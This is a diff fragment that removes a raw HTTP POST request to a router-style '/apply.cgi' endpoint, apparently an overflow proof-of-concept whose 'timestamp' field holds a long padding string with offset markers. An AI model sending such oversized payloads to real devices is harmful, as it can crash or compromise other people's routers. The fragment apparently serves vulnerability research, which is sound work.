@@ -1,6 +1,0 @@
-POST /apply.cgi?connect_status HTTP/1.1
-Host: 100
-Content-Type: application/json
-Content-Length: 333
-
-auto_check_for_upgrade=wzqwzqwzq&submit_flag=ca_change_language&%20timestamp=aaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
